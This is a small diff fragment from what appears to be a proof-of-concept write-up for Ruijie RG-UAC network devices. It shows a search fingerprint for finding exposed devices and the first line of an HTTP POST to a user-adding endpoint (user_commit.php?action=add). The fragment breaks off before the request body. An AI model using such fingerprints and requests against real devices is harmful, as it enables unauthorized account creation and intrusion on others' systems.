@@ -8,7 +8,7 @@
 app="Ruijie-RG-UAC"
 ```
 
-## poc
+## POC
 
 ```
 POST /view/systemConfig/sys_user/user_commit.php?action=add HTTP/1.1
